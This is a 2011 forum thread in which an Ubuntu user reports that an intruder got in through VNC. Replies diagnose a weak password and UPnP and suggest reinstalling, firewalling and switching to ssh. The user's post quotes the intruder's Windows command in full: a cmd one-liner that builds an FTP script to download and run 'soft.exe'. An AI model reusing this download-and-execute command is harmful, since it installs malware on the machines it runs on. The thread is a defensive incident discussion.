---
title: "new user question"
date: 2011-05-03
forum: Security
---

### Post by mobyrock on 2011-05-03
i have ubuntu 10.4 installed on an old hp laptop and am using it only to play networked music and movies on a flatscreen in my family room.  i login in to it remotely from my windows 7 computer via tightVNC 1.5.2 when i am in my home office working.  i have let the update manager in ubuntu run any update that comes in.

i am albe open the terminal and follow directions, but that's the extent of my "expertise"

today, i turned on the ubuntu machine and started some music locally and went to my office to work.  i am using movieplayer 2.3.02 as my music player.

a window opened on its own in movie player to save a new playlist - with this pasted into the filename field ( i did not see the text typed in.  i went to my office, and came back into the room to see the save playlist dialog on the screen)

[COLOR=Navy]**/c echo open IP 21 >> ik &echo user dsluser telnet >> ik &echo binary >> ik &echo get soft.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &soft.exe &exit**[/COLOR]

i copied the text and pasted it into an office doc and am on the forums from my windows 7 computer.

does this indicate that there is a hacker in my system?  and if so how?
i apologize if this is a question any competent user should be able to answer, but appreciate the indulgence.

thanks

---

### Post by bodhi.zazen on 2011-05-03
Yep your were cracked via your vnc server. You probably are using a wesk password and your router is using UPnP, meaning it automatically opened a port.

Those commands are for a windows machine and so probably did not affect you.

You should :

1. Probably best to re-install Ubuntu.

2. Configure your router and turn UPnP off !!!

3. Use ssh and not VNC.

4. Enable your firewall, see ufw, and allow incoming connections only from your LAN.

5. Use strong passwords.

---

### Post by Joe of loath on 2011-05-03
AFAIK what's typed in is a load of rubbish, but you have indeed been hacked. Best sort it before someone more adept than a script kiddie gets in.

---

### Post by mobyrock on 2011-05-03
thank you for your reply.  i am in progress on those steps.

---

